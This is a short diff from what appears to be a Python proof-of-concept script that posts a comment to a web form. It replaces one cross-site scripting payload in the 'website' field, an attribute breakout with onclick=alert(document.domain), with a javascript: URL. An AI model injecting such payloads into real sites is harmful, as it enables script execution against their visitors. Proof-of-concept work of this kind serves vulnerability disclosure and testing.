@@ -36,7 +36,7 @@ def main():
         'comment': 'This is a comment',
         'name': 'Name',
         'email': 'invalid@example.com',
-        'website': 'http://www.example.com" onclick="alert(document.domain)'
+        'website': 'javascript:alert(document.domain)'
     }
     if client.post(url, data=data).status_code == 302:
         print(f'[-] Something appeared to be wrong posting the comment')
